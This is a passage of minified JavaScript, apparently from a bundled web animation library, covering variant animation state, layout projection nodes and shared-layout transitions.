Wv(t,n,s)}build(t,n,s){Sv(t,n,this.isSVGTag,s.transformTemplate,s.style)}renderInstance(t,n,s,r){LC(t,n,s,r)}mount(t){this.isSVGTag=Vv(t.tagName),super.mount(t)}}const _C=wa.length;function Uv(e){if(!e)return;if(!e.isControllingVariants){const n=e.parent?Uv(e.parent)||{}:{};return e.props.initial!==void 0&&(n.initial=e.props.initial),n}const t={};for(let n=0;n<_C;n++){const s=wa[n],r=e.props[s];(hi(r)||r===!1)&&(t[s]=r)}return t}function zv(e,t){if(!Array.isArray(t))return!1;const n=t.length;if(n!==e.length)return!1;for(let s=0;s<n;s++)if(t[s]!==e[s])return!1;return!0}const FC=[...fh].reverse(),BC=fh.length;function VC(e){return t=>Promise.all(t.map(({animation:n,options:s})=>UT(e,n,s)))}function WC(e){let t=VC(e),n=Nf(),s=!0,r=!1;const i=c=>(u,d)=>{var m;const h=Yn(e,d,c==="exit"?(m=e.presenceContext)==null?void 0:m.custom:void 0);if(h){const{transition:f,transitionEnd:v,...x}=h;u={...u,...x,...v}}return u};function o(c){t=c(e)}function a(c){const{props:u}=e,d=Uv(e.parent)||{},h=[],m=new Set;let f={},v=1/0;for(let y=0;y<BC;y++){const g=FC[y],b=n[g],k=u[g]!==void 0?u[g]:d[g],C=hi(k),E=g===c?b.isActive:null;E===!1&&(v=y);let S=k===d[g]&&k!==u[g]&&C;if(S&&(s||r)&&e.manuallyAnimateOnMount&&(S=!1),b.protectedKeys={...f},!b.isActive&&E===null||!k&&!b.prevProp||Ya(k)||typeof k=="boolean")continue;if(g==="exit"&&b.isActive&&E!==!0){b.prevResolvedValues&&(f={...f,...b.prevResolvedValues});continue}const T=UC(b.prevProp,k);let q=T||g===c&&b.isActive&&!S&&C||y>v&&C,R=!1;const M=Array.isArray(k)?k:[k];let Q=M.reduce(i(g),{});E===!1&&(Q={});const{prevResolvedValues:$={}}=b,Ue={...$,...Q},D=A=>{q=!0,m.has(A)&&(R=!0,m.delete(A)),b.needsAnimating[A]=!0;const O=e.getValue(A);O&&(O.liveStyle=!1)};for(const A in Ue){const O=Q[A],j=$[A];if(f.hasOwnProperty(A))continue;let V=!1;bu(O)&&bu(j)?V=!zv(O,j)||T:V=O!==j,V?O!=null?D(A):m.add(A):O!==void 0&&m.has(A)?D(A):b.protectedKeys[A]=!0}b.prevProp=k,b.prevResolvedValues=Q,b.isActive&&(f={...f,...Q}),(s||r)&&e.blockInitialAnimation&&(q=!1);const _=S&&T;q&&(!_||R)&&h.push(...M.map(A=>{const O={type:g};if(typeof A=="string"&&(s||r)&&!_&&e.manuallyAnimateOnMount&&e.parent){const{parent:j}=e,V=Yn(j,A);if(j.enteringChildren&&V){const{delayChildren:Y}=V.transition||{};O.delay=fv(j.enteringChildren,e,Y)}}return{animation:A,options:O}}))}if(m.size){const y={};if(typeof u.initial!="boolean"){const g=Yn(e,Array.isArray(u.initial)?u.initial[0]:u.initial);g&&g.transition&&(y.transition=g.transition)}m.forEach(g=>{const b=e.getBaseTarget(g),k=e.getValue(g);k&&(k.liveStyle=!0),y[g]=b??null}),h.push({animation:y})}let x=!!h.length;return s&&(u.initial===!1||u.initial===u.animate)&&!e.manuallyAnimateOnMount&&(x=!1),s=!1,r=!1,x?t(h):Promise.resolve()}function l(c,u){var h;if(n[c].isActive===u)return Promise.resolve();(h=e.variantChildren)==null||h.forEach(m=>{var f;return(f=m.animationState)==null?void 0:f.setActive(c,u)}),n[c].isActive=u;const d=a(c);for(const m in n)n[m].protectedKeys={};return d}return{animateChanges:a,setActive:l,setAnimateFunction:o,getState:()=>n,reset:()=>{n=Nf(),r=!0}}}function UC(e,t){return typeof t=="string"?t!==e:Array.isArray(t)?!zv(t,e):!1}function jn(e=!1){return{isActive:e,protectedKeys:{},needsAnimating:{},prevResolvedValues:{}}}function Nf(){return{animate:jn(!0),whileInView:jn(),whileHover:jn(),whileTap:jn(),whileDrag:jn(),whileFocus:jn(),exit:jn()}}function Ru(e,t){e.min=t.min,e.max=t.max}function ht(e,t){Ru(e.x,t.x),Ru(e.y,t.y)}function jf(e,t){e.translate=t.translate,e.scale=t.scale,e.originPoint=t.originPoint,e.origin=t.origin}const $v=1e-4,zC=1-$v,$C=1+$v,Hv=.01,HC=0-Hv,QC=0+Hv;function Pe(e){return e.max-e.min}function GC(e,t,n){return Math.abs(e-t)<=n}function Mf(e,t,n,s=.5){e.origin=s,e.originPoint=H(t.min,t.max,e.origin),e.scale=Pe(n)/Pe(t),e.translate=H(n.min,n.max,e.origin)-e.originPoint,(e.scale>=zC&&e.scale<=$C||isNaN(e.scale))&&(e.scale=1),(e.translate>=HC&&e.translate<=QC||isNaN(e.translate))&&(e.translate=0)}function Br(e,t,n,s){Mf(e.x,t.x,n.x,s?s.originX:void 0),Mf(e.y,t.y,n.y,s?s.originY:void 0)}function Lf(e,t,n,s=0){const r=s?H(n.min,n.max,s):n.min;e.min=r+t.min,e.max=e.min+Pe(t)}function KC(e,t,n,s){Lf(e.x,t.x,n.x,s==null?void 0:s.x),Lf(e.y,t.y,n.y,s==null?void 0:s.y)}function Df(e,t,n,s=0){const r=s?H(n.min,n.max,s):n.min;e.min=t.min-r,e.max=e.min+Pe(t)}function xa(e,t,n,s){Df(e.x,t.x,n.x,s==null?void 0:s.x),Df(e.y,t.y,n.y,s==null?void 0:s.y)}function _f(e,t,n,s,r){return e-=t,e=ya(e,1/n,s),r!==void 0&&(e=ya(e,1/r,s)),e}function YC(e,t=0,n=1,s=.5,r,i=e,o=e){if(Mt.test(t)&&(t=parseFloat(t),t=H(o.min,o.max,t/100)-o.min),typeof t!="number")return;let a=H(i.min,i.max,s);e===i&&(a-=t),e.min=_f(e.min,t,n,a,r),e.max=_f(e.max,t,n,a,r)}function Ff(e,t,[n,s,r],i,o){YC(e,t[n],t[s],t[r],t.scale,i,o)}const XC=["x","scaleX","originX"],JC=["y","scaleY","originY"];function Bf(e,t,n,s){Ff(e.x,t,XC,n?n.x:void 0,s?s.x:void 0),Ff(e.y,t,JC,n?n.y:void 0,s?s.y:void 0)}function Vf(e){return e.translate===0&&e.scale===1}function Qv(e){return Vf(e.x)&&Vf(e.y)}function Wf(e,t){return e.min===t.min&&e.max===t.max}function ZC(e,t){return Wf(e.x,t.x)&&Wf(e.y,t.y)}function Uf(e,t){return Math.round(e.min)===Math.round(t.min)&&Math.round(e.max)===Math.round(t.max)}function Gv(e,t){return Uf(e.x,t.x)&&Uf(e.y,t.y)}function zf(e){return Pe(e.x)/Pe(e.y)}function $f(e,t){return e.translate===t.translate&&e.scale===t.scale&&e.originPoint===t.originPoint}function Et(e){return[e("x"),e("y")]}function eA(e,t,n){let s="";const r=e.x.translate/t.x,i=e.y.translate/t.y,o=(n==null?void 0:n.z)||0;if((r||i||o)&&(s=`translate3d(${r}px, ${i}px, ${o}px) `),(t.x!==1||t.y!==1)&&(s+=`scale(${1/t.x}, ${1/t.y}) `),n){const{transformPerspective:c,rotate:u,pathRotation:d,rotateX:h,rotateY:m,skewX:f,skewY:v}=n;c&&(s=`perspective(${c}px) ${s}`),u&&(s+=`rotate(${u}deg) `),d&&(s+=`rotate(${d}deg) `),h&&(s+=`rotateX(${h}deg) `),m&&(s+=`rotateY(${m}deg) `),f&&(s+=`skewX(${f}deg) `),v&&(s+=`skewY(${v}deg) `)}const a=e.x.scale*t.x,l=e.y.scale*t.y;return(a!==1||l!==1)&&(s+=`scale(${a}, ${l})`),s||"none"}const tA=uh.length,Hf=e=>typeof e=="string"?parseFloat(e):e,Qf=e=>typeof e=="number"||N.test(e);function nA(e,t,n,s,r,i){r?(e.opacity=H(0,n.opacity??1,sA(s)),e.opacityExit=H(t.opacity??1,0,rA(s))):i&&(e.opacity=H(t.opacity??1,n.opacity??1,s));for(let o=0;o<tA;o++){const a=uh[o];let l=Gf(t,a),c=Gf(n,a);if(l===void 0&&c===void 0)continue;l||(l=0),c||(c=0),l===0||c===0||Qf(l)===Qf(c)?(e[a]=Math.max(H(Hf(l),Hf(c),s),0),(Mt.test(c)||Mt.test(l))&&(e[a]+="%")):e[a]=c}(t.rotate||n.rotate)&&(e.rotate=H(t.rotate||0,n.rotate||0,s))}function Gf(e,t){return e[t]!==void 0?e[t]:e.borderRadius}const sA=Kv(0,.5,Dw),rA=Kv(.5,.95,Ye);function Kv(e,t,n){return s=>s<e?0:s>t?1:n(Xs(e,t,s))}function iA(e,t,n){const s=me(e)?e:yt(e);return s.start(ah("",s,t,n)),s.animation}function pi(e,t,n,s={passive:!0}){return e.addEventListener(t,n,s),()=>e.removeEventListener(t,n,s)}const oA=(e,t)=>e.depth-t.depth;class aA{constructor(){this.children=[],this.isDirty=!1}add(t){Vd(this.children,t),this.isDirty=!0}remove(t){ua(this.children,t),this.isDirty=!0}forEach(t){this.isDirty&&this.children.sort(oA),this.isDirty=!1,this.children.forEach(t)}}function lA(e,t){const n=be.now(),s=({timestamp:r})=>{const i=r-n;i>=t&&(We(s),e(i-t))};return B.setup(s,!0),()=>We(s)}function Lo(e){return me(e)?e.get():e}class cA{constructor(){this.members=[]}add(t){Vd(this.members,t);for(let n=this.members.length-1;n>=0;n--){const s=this.members[n];if(s===t||s===this.lead||s===this.prevLead)continue;const r=s.instance;(!r||r.isConnected===!1)&&!s.snapshot&&(ua(this.members,s),s.unmount())}t.scheduleRender()}remove(t){if(ua(this.members,t),t===this.prevLead&&(this.prevLead=void 0),t===this.lead){const n=this.members[this.members.length-1];n&&this.promote(n)}}relegate(t){var n;for(let s=this.members.indexOf(t)-1;s>=0;s--){const r=this.members[s];if(r.isPresent!==!1&&((n=r.instance)==null?void 0:n.isConnected)!==!1)return this.promote(r),!0}return!1}promote(t,n){var r;const s=this.lead;if(t!==s&&(this.prevLead=s,this.lead=t,t.show(),s)){s.updateSnapshot(),t.scheduleRender();const{layoutDependency:i}=s.options,{layoutDependency:o}=t.options;(i===void 0||i!==o)&&(t.resumeFrom=s,n&&(s.preserveOpacity=!0),s.snapshot&&(t.snapshot=s.snapshot,t.snapshot.latestValues=s.animationValues||s.latestValues),(r=t.root)!=null&&r.isUpdating&&(t.isLayoutDirty=!0)),t.options.crossfade===!1&&s.hide()}}exitAnimationComplete(){this.members.forEach(t=>{var n,s,r,i,o;(s=(n=t.options).onExitComplete)==null||s.call(n),(o=(r=t.resumingFrom)==null?void 0:(i=r.options).onExitComplete)==null||o.call(i)})}scheduleRender(){this.members.forEach(t=>t.instance&&t.scheduleRender(!1))}removeLeadSnapshot(){var t;(t=this.lead)!=null&&t.snapshot&&(this.lead.snapshot=void 0)}}const Do={hasAnimatedSinceResize:!0,hasEverUpdated:!1},_l=["","X","Y","Z"],uA=1e3;let dA=0;function Fl(e,t,n,s){const{latestValues:r}=t;r[e]&&(n[e]=r[e],t.setStaticValue(e,0),s&&(s[e]=0))}function Yv(e){if(e.hasCheckedOptimisedAppear=!0,e.root===e)return;const{visualElement:t}=e.options;if(!t)return;const n=vv(t);if(window.MotionHasOptimisedAnimation(n,"transform")){const{layout:r,layoutId:i}=e.options;window.MotionCancelOptimisedAnimation(n,"transform",B,!(r||i))}const{parent:s}=e;s&&!s.hasCheckedOptimisedAppear&&Yv(s)}function Xv({attachResizeListener:e,defaultParent:t,measureScroll:n,checkIsScrollRoot:s,resetTransform:r}){return class{constructor(o={},a=t==null?void 0:t()){this.id=dA++,this.animationId=0,this.animationCommitId=0,this.children=new Set,this.options={},this.isTreeAnimating=!1,this.isAnimationBlocked=!1,this.isLayoutDirty=!1,this.isProjectionDirty=!1,this.isSharedProjectionDirty=!1,this.isTransformDirty=!1,this.updateManuallyBlocked=!1,this.updateBlockedByResize=!1,this.isUpdating=!1,this.isSVG=!1,this.needsReset=!1,this.shouldResetTransform=!1,this.hasCheckedOptimisedAppear=!1,this.treeScale={x:1,y:1},this.eventHandlers=new Map,this.hasTreeAnimated=!1,this.layoutVersion=0,this.updateScheduled=!1,this.scheduleUpdate=()=>this.update(),this.projectionUpdateScheduled=!1,this.checkUpdateFailed=()=>{this.isUpdating&&(this.isUpdating=!1,this.clearAllSnapshots())},this.updateProjection=()=>{this.projectionUpdateScheduled=!1,this.nodes.forEach(fA),this.nodes.forEach(bA),this.nodes.forEach(xA),this.nodes.forEach(mA)},this.resolvedRelativeTargetAt=0,this.linkedParentVersion=0,this.hasProjected=!1,this.isVisible=!0,this.animationProgress=0,this.sharedNodes=new Map,this.latestValues=o,this.root=a?a.root||a:this,this.path=a?[...a.path,a]:[],this.parent=a,this.depth=a?a.depth+1:0;for(let l=0;l<this.path.length;l++)this.path[l].shouldResetTransform=!0;this.root===this&&(this.nodes=new aA)}addEventListener(o,a){return this.eventHandlers.has(o)||this.eventHandlers.set(o,new da),this.eventHandlers.get(o).add(a)}notifyListeners(o,...a){const l=this.eventHandlers.get(o);l&&l.notify(...a)}hasListeners(o){return this.eventHandlers.has(o)}mount(o){if(this.instance)return;this.isSVG=dh(o)&&!TC(o),this.instance=o;const{layoutId:a,layout:l,visualElement:c}=this.options;if(c&&!c.current&&c.mount(o),this.root.nodes.add(this),this.parent&&this.parent.children.add(this),this.root.hasTreeAnimated&&(l||a)&&(this.isLayoutDirty=!0),e){let u,d=0;const h=()=>this.root.updateBlockedByResize=!1;B.read(()=>{d=window.innerWidth}),e(o,()=>{const m=window.innerWidth;m!==d&&(d=m,this.root.updateBlockedByResize=!0,u&&u(),u=lA(h,250),Do.hasAnimatedSinceResize&&(Do.hasAnimatedSinceResize=!1,this.nodes.forEach(Xf)))})}a&&this.root.registerSharedNode(a,this),this.options.animate!==!1&&c&&(a||l)&&this.addEventListener("didUpdate",({delta:u,hasLayoutChanged:d,hasRelativeLayoutChanged:h,layout:m})=>{if(this.isTreeAnimationBlocked()){this.target=void 0,this.relativeTarget=void 0;return}const f=this.options.transition||c.getDefaultTransition()||AA,{onLayoutAnimationStart:v,onLayoutAnimationComplete:x}=c.getProps(),y=!this.targetLayout||!Gv(this.targetLayout,m),g=!d&&h;if(this.options.layoutRoot||this.resumeFrom||g||d&&(y||!this.currentAnimation)){this.resumeFrom&&(this.resumingFrom=this.resumeFrom,this.resumingFrom.resumingFrom=void 0);const b={...oh(f,"layout"),onPlay:v,onComplete:x};(c.shouldReduceMotion||this.options.layoutRoot)&&(b.delay=0,b.type=!1),this.startAnimation(b),this.setAnimationOrigin(u,g,b.path)}else d||Xf(this),this.isLead()&&this.options.onExitComplete&&this.options.onExitComplete();this.targetLayout=m})}unmount(){this.options.layoutId&&this.willUpdate(),this.root.nodes.remove(this);const o=this.getStack();o&&o.remove(this),this.parent&&this.parent.children.delete(this),this.instance=void 0,this.eventHandlers.clear(),We(this.updateProjection)}blockUpdate(){this.updateManuallyBlocked=!0}unblockUpdate(){this.updateManuallyBlocked=!1}isUpdateBlocked(){return this.updateManuallyBlocked||this.updateBlockedByResize}isTreeAnimationBlocked(){return this.isAnimationBlocked||this.parent&&this.parent.isTreeAnimationBlocked()||!1}startUpdate(){this.isUpdateBlocked()||(this.isUpdating=!0,this.nodes&&this.nodes.forEach(kA),this.animationId++)}getTransformTemplate(){const{visualElement:o}=this.options;return o&&o.getProps().transformTemplate}willUpdate(o=!0){if(this.root.hasTreeAnimated=!0,this.root.isUpdateBlocked()){this.options.onExitComplete&&this.options.onExitComplete();return}if(window.MotionCancelOptimisedAnimation&&!this.hasCheckedOptimisedAppear&&Yv(this),!this.root.isUpdating&&this.root.startUpdate(),this.isLayoutDirty)return;this.isLayoutDirty=!0;for(let u=0;u<this.path.length;u++){const d=this.path[u];d.shouldResetTransform=!0,(typeof d.latestValues.x=="string"||typeof d.latestValues.y=="string")&&(d.isLayoutDirty=!0),d.updateScroll("snapshot"),d.options.layoutRoot&&d.willUpdate(!1)}const{layoutId:a,layout:l}=this.options;if(a===void 0&&!l)return;const c=this.getTransformTemplate();this.prevTransformTemplateValue=c?c(this.latestValues,""):void 0,this.updateSnapshot(),o&&this.notifyListeners("willUpdate")}update(){if(this.updateScheduled=!1,this.isUpdateBlocked()){const l=this.updateBlockedByResize;this.unblockUpdate(),this.updateBlockedByResize=!1,this.clearAllSnapshots(),l&&this.nodes.forEach(yA),this.nodes.forEach(Kf);return}if(this.animationId<=this.animationCommitId){this.nodes.forEach(Yf);return}this.animationCommitId=this.animationId,this.isUpdating?(this.isUpdating=!1,this.nodes.forEach(wA),this.nodes.forEach(vA),this.nodes.forEach(hA),this.nodes.forEach(pA)):this.nodes.forEach(Yf),this.clearAllSnapshots();const a=be.now();ce.delta=ut(0,1e3/60,a-ce.timestamp),ce.timestamp=a,ce.isProcessing=!0,ql.update.process(ce),ql.preRender.process(ce),ql.render.process(ce),ce.isProcessing=!1}didUpdate(){this.updateScheduled||(this.updateScheduled=!0,Js.read(this.scheduleUpdate))}clearAllSnapshots(){this.nodes.forEach(gA),this.sharedNodes.forEach(SA)}scheduleUpdateProjection(){this.projectionUpdateScheduled||(this.projectionUpdateScheduled=!0,B.preRender(this.updateProjection,!1,!0))}scheduleCheckAfterUnmount(){B.postRender(()=>{this.isLayoutDirty?this.root.didUpdate():this.root.checkUpdateFailed()})}updateSnapshot(){this.snapshot||!this.instance||(this.snapshot=this.measure(),this.snapshot&&!Pe(this.snapshot.measuredBox.x)&&!Pe(this.snapshot.measuredBox.y)&&(this.snapshot=void 0))}updateLayout(){if(!this.instance||(this.updateScroll(),!(this.options.alwaysMeasureLayout&&this.isLead())&&!this.isLayoutDirty))return;if(this.resumeFrom&&!this.resumeFrom.instance)for(let l=0;l<this.path.length;l++)this.path[l].updateScroll();const o=this.layout;this.layout=this.measure(!1),this.layoutVersion++,this.layoutCorrected||(this.layoutCorrected=de()),this.isLayoutDirty=!1,this.projectionDelta=void 0,this.notifyListeners("measure",this.layout.layoutBox);const{visualElement:a}=this.options;a&&a.notify("LayoutMeasure",this.layout.layoutBox,o?o.layoutBox:void 0)}updateScroll(o="measure"){let a=!!(this.options.layoutScroll&&this.instance);if(this.scroll&&this.scroll.animationId===this.root.animationId&&this.scroll.phase===o&&(a=!1),a&&this.instance){const l=s(this.instance);this.scroll={animationId:this.root.animationId,phase:o,isRoot:l,offset:n(this.instance),wasRoot:this.scroll?this.scroll.isRoot:l}}}resetTransform(){if(!r)return;const o=this.isLayoutDirty||this.shouldResetTransform||this.options.alwaysMeasureLayout,a=this.projectionDelta&&!Qv(this.projectionDelta),l=this.getTransformTemplate(),c=l?l(this.latestValues,""):void 0,u=c!==this.prevTransformTemplateValue;o&&this.instance&&(a||_n(this.latestValues)||u)&&(r(this.instance,c),this.shouldResetTransform=!1,this.scheduleRender())}measure(o=!0){const a=this.measurePageBox();let l=this.removeElementScroll(a);return o&&(l=this.removeTransform(l)),EA(l),{animationId:this.root.animationId,measuredBox:a,layoutBox:l,latestValues:{},source:this.id}}measurePageBox(){var c;const{visualElement:o}=this.options;if(!o)return de();const a=o.measureViewportBox();if(!(((c=this.scroll)==null?void 0:c.wasRoot)||this.path.some(RA))){const{scroll:u}=this.root;u&&(Pt(a.x,u.offset.x),Pt(a.y,u.offset.y))}return a}removeElementScroll(o){var l;const a=de();if(ht(a,o),(l=this.scroll)!=null&&l.wasRoot)return a;for(let c=0;c<this.path.length;c++){const u=this.path[c],{scroll:d,options:h}=u;u!==this.root&&d&&h.layoutScroll&&(d.wasRoot&&ht(a,o),Pt(a.x,d.offset.x),Pt(a.y,d.offset.y))}return a}applyTransform(o,a=!1,l){var u,d;const c=l||de();ht(c,o);for(let h=0;h<this.path.length;h++){const m=this.path[h];!a&&m.options.layoutScroll&&m.scroll&&m!==m.root&&(Pt(c.x,-m.scroll.offset.x),Pt(c.y,-m.scroll.offset.y)),_n(m.latestValues)&&Io(c,m.latestValues,(u=m.layout)==null?void 0:u.layoutBox)}return _n(this.latestValues)&&Io(c,this.latestValues,(d=this.layout)==null?void 0:d.layoutBox),c}removeTransform(o){var l;const a=de();ht(a,o);for(let c=0;c<this.path.length;c++){const u=this.path[c];if(!_n(u.latestValues))continue;let d;u.instance&&(Tu(u.latestValues)&&u.updateSnapshot(),d=de(),ht(d,u.measurePageBox())),Bf(a,u.latestValues,(l=u.snapshot)==null?void 0:l.layoutBox,d)}return _n(this.latestValues)&&Bf(a,this.latestValues),a}setTargetDelta(o){this.targetDelta=o,this.root.scheduleUpdateProjection(),this.isProjectionDirty=!0}setOptions(o){this.options={...this.options,...o,crossfade:o.crossfade!==void 0?o.crossfade:!0}}clearMeasurements(){this.scroll=void 0,this.layout=void 0,this.snapshot=void 0,this.prevTransformTemplateValue=void 0,this.targetDelta=void 0,this.target=void 0,this.isLayoutDirty=!1}forceRelativeParentToResolveTarget(){this.relativeParent&&this.relativeParent.resolvedRelativeTargetAt!==ce.timestamp&&this.relativeParent.resolveTargetDelta(!0)}resolveTargetDelta(o=!1){var m;const a=this.getLead();this.isProjectionDirty||(this.isProjectionDirty=a.isProjectionDirty),this.isTransformDirty||(this.isTransformDirty=a.isTransformDirty),this.isSharedProjectionDirty||(this.isSharedProjectionDirty=a.isSharedProjectionDirty);const l=!!this.resumingFrom||this!==a;if(!(o||l&&this.isSharedProjectionDirty||this.isProjectionDirty||(m=this.parent)!=null&&m.isProjectionDirty||this.attemptToResolveRelativeTarget||this.root.updateBlockedByResize))return;const{layout:u,layoutId:d}=this.options;if(!this.layout||!(u||d))return;this.resolvedRelativeTargetAt=ce.timestamp;const h=this.getClosestProjectingParent();h&&this.linkedParentVersion!==h.layoutVersion&&!h.options.layoutRoot&&this.removeRelativeTarget(),!this.targetDelta&&!this.relativeTarget&&(this.options.layoutAnchor!==!1&&h&&h.layout?this.createRelativeTarget(h,this.layout.layoutBox,h.layout.layoutBox):this.removeRelativeTarget()),!(!this.relativeTarget&&!this.targetDelta)&&(this.target||(this.target=de(),this.targetWithTransforms=de()),this.relativeTarget&&this.relativeTargetOrigin&&this.relativeParent&&this.relativeParent.target?(this.forceRelativeParentToResolveTarget(),KC(this.target,this.relativeTarget,this.relativeParent.target,this.options.layoutAnchor||void 0)):this.targetDelta?(this.resumingFrom?this.applyTransform(this.layout.layoutBox,!1,this.target):ht(this.target,this.layout.layoutBox),Av(this.target,this.targetDelta)):ht(this.target,this.layout.layoutBox),this.attemptToResolveRelativeTarget&&(this.attemptToResolveRelativeTarget=!1,this.options.layoutAnchor!==!1&&h&&!!h.resumingFrom==!!this.resumingFrom&&!h.options.layoutScroll&&h.target&&this.animationProgress!==1?this.createRelativeTarget(h,this.target,h.target):this.relativeParent=this.relativeTarget=void 0))}getClosestProjectingParent(){if(!(!this.parent||Tu(this.parent.latestValues)||Cv(this.parent.latestValues)))return this.parent.isProjecting()?this.parent:this.parent.getClosestProjectingParent()}isProjecting(){return!!((this.relativeTarget||this.targetDelta||this.options.layoutRoot)&&this.layout)}createRelativeTarget(o,a,l){this.relativeParent=o,this.linkedParentVersion=o.layoutVersion,this.forceRelativeParentToResolveTarget(),this.relativeTarget=de(),this.relativeTargetOrigin=de(),xa(this.relativeTargetOrigin,a,l,this.options.layoutAnchor||void 0),ht(this.relativeTarget,this.relativeTargetOrigin)}removeRelativeTarget(){this.relativeParent=this.relativeTarget=void 0}calcProjection(){var f;const o=this.getLead(),a=!!this.resumingFrom||this!==o;let l=!0;if((this.isProjectionDirty||(f=this.parent)!=null&&f.isProjectionDirty)&&(l=!1),a&&(this.isSharedProjectionDirty||this.isTransformDirty)&&(l=!1),this.resolvedRelativeTargetAt===ce.timestamp&&(l=!1),l)return;const{layout:c,layoutId:u}=this.options;if(this.isTreeAnimating=!!(this.parent&&this.parent.isTreeAnimating||this.currentAnimation||this.pendingAnimation),this.isTreeAnimating||(this.targetDelta=this.relativeTarget=void 0),!this.layout||!(c||u))return;ht(this.layoutCorrected,this.layout.layoutBox);const d=this.treeScale.x,h=this.treeScale.y;iC(this.layoutCorrected,this.treeScale,this.path,a),o.layout&&!o.target&&(this.treeScale.x!==1||this.treeScale.y!==1)&&(o.target=o.layout.layoutBox,o.targetWithTransforms=de());const{target:m}=o;if(!m){this.prevProjectionDelta&&(this.createProjectionDeltas(),this.scheduleRender());return}!this.projectionDelta||!this.prevProjectionDelta?this.createProjectionDeltas():(jf(this.prevProjectionDelta.x,this.projectionDelta.x),jf(this.prevProjectionDelta.y,this.projectionDelta.y)),Br(this.projectionDelta,this.layoutCorrected,m,this.latestValues),(this.treeScale.x!==d||this.treeScale.y!==h||!$f(this.projectionDelta.x,this.prevProjectionDelta.x)||!$f(this.projectionDelta.y,this.prevProjectionDelta.y))&&(this.hasProjected=!0,this.scheduleRender(),this.notifyListeners("projectionUpdate",m))}hide(){this.isVisible=!1}show(){this.isVisible=!0}scheduleRender(o=!0){var a;if((a=this.options.visualElement)==null||a.scheduleRender(),o){const l=this.getStack();l&&l.scheduleRender()}this.resumingFrom&&!this.resumingFrom.instance&&(this.resumingFrom=void 0)}createProjectionDeltas(){this.prevProjectionDelta=Ps(),this.projectionDelta=Ps(),this.projectionDeltaWithTransform=Ps()}setAnimationOrigin(o,a=!1,l){const c=this.snapshot,u=c?c.latestValues:{},d={...this.latestValues},h=Ps();(!this.relativeParent||!this.relativeParent.options.layoutRoot)&&(this.relativeTarget=this.relativeTargetOrigin=void 0),this.attemptToResolveRelativeTarget=!a;const m=de(),f=c?c.source:void 0,v=this.layout?this.layout.source:void 0,x=f!==v,y=this.getStack(),g=!y||y.members.length<=1,b=!!(x&&!g&&this.options.crossfade===!0&&!this.path.some(CA));this.animationProgress=0;let k;const C=l==null?void 0:l.interpolateProjection(o);this.mixTargetDelta=E=>{const S=E/1e3,T=C==null?void 0:C(S);T?(h.x.translate=T.x,h.x.scale=H(o.x.scale,1,S),h.x.origin=o.x.origin,h.x.originPoint=o.x.originPoint,h.y.translate=T.y,h.y.scale=H(o.y.scale,1,S),h.y.origin=o.y.origin,h.y.originPoint=o.y.originPoint):(Jf(h.x,o.x,S),Jf(h.y,o.y,S)),this.setTargetDelta(h),this.relativeTarget&&this.relativeTargetOrigin&&this.layout&&this.relativeParent&&this.relativeParent.layout&&(xa(m,this.layout.layoutBox,this.relativeParent.layout.layoutBox,this.options.layoutAnchor||void 0),TA(this.relativeTarget,this.relativeTargetOrigin,m,S),k&&ZC(this.relativeTarget,k)&&(this.isProjectionDirty=!1),k||(k=de()),ht(k,this.relativeTarget)),x&&(this.animationValues=d,nA(d,u,this.latestValues,S,b,g)),T&&T.rotate!==void 0&&(this.animationValues||(this.animationValues=d),this.animationValues.pathRotation=T.rotate),this.root.scheduleUpdateProjection(),this.scheduleRender(),this.animationProgress=S},this.mixTargetDelta(this.options.layoutRoot?1e3:0)}startAnimation(o){var a,l,c;this.notifyListeners("animationStart"),(a=this.currentAnimation)==null||a.stop(),(c=(l=this.resumingFrom)==null?void 0:l.currentAnimation)==null||c.stop(),this.pendingAnimation&&(We(this.pendingAnimation),this.pendingAnimation=void 0),this.pendingAnimation=B.update(()=>{Do.hasAnimatedSinceResize=!0,this.motionValue||(this.motionValue=yt(0)),this.motionValue.jump(0,!1),this.currentAnimation=iA(this.motionValue,[0,1e3],{...o,velocity:0,isSync:!0,onUpdate:u=>{this.mixTargetDelta(u),o.onUpdate&&o.onUpdate(u)},onComplete:()=>{o.onComplete&&o.onComplete(),this.completeAnimation()}}),zS(this.currentAnimation,this),this.resumingFrom&&(this.resumingFrom.currentAnimation=this.currentAnimation),this.pendingAnimation=void 0})}completeAnimation(){this.resumingFrom&&(this.resumingFrom.currentAnimation=void 0,this.resumingFrom.preserveOpacity=void 0);const o=this.getStack();o&&o.exitAnimationComplete(),this.resumingFrom=this.currentAnimation=this.animationValues=void 0,this.notifyListeners("animationComplete")}finishAnimation(){this.currentAnimation&&(this.mixTargetDelta&&this.mixTargetDelta(uA),this.currentAnimation.stop()),this.completeAnimation()}applyTransformsToTarget(){const o=this.getLead(),{targetWithTransforms:a,layout:l,latestValues:c}=o;let{target:u}=o;if(!(!a||!u||!l)){if(this!==o&&this.layout&&l&&Jv(this.options.animationType,this.layout.layoutBox,l.layoutBox)){u=this.target||de();const d=Pe(this.layout.layoutBox.x);u.x.min=o.target.x.min,u.x.max=u.x.min+d;const h=Pe(this.layout.layoutBox.y);u.y.min=o.target.y.min,u.y.max=u.y.min+h}ht(a,u),Io(a,c),Br(this.projectionDeltaWithTransform,this.layoutCorrected,a,c)}}registerSharedNode(o,a){this.sharedNodes.has(o)||this.sharedNodes.set(o,new cA),this.sharedNodes.get(o).add(a);const c=a.options.initialPromotionConfig;a.promote({transition:c?c.transition:void 0,preserveFollowOpacity:c&&c.shouldPreserveFollowOpacity?c.shouldPreserveFollowOpacity(a):void 0})}isLead(){const o=this.getStack();return o?o.lead===this:!0}getLead(){var a;const{layoutId:o}=this.options;return o?((a=this.getStack())==null?void 0:a.lead)||this:this}getPrevLead(){var a;const{layoutId:o}=this.options;return o?(a=this.getStack())==null?void 0:a.prevLead:void 0}getStack(){const{layoutId:o}=this.options;if(o)return this.root.sharedNodes.get(o)}promote({needsReset:o,transition:a,preserveFollowOpacity:l}={}){const c=this.getStack();c&&c.promote(this,l),o&&(this.projectionDelta=void 0,this.needsReset=!0),a&&this.setOptions({transition:a})}relegate(){const o=this.getStack();return o?o.relegate(this):!1}resetSkewAndRotation(){const{visualElement:o}=this.options;if(!o)return;let a=!1;const{latestValues:l}=o;if((l.z||l.rotate||l.rotateX||l.rotateY||l.rotateZ||l.skewX||l.skewY)&&(a=!0),!a)return;const c={};l.z&&Fl("z",o,c,this.animationValues);for(let u=0;u<_l.length;u++)Fl(`rotate${_l[u]}`,o,c,this.animationValues),Fl(`skew${_l[u]}`,o,c,this.animationValues);o.render();for(const u in 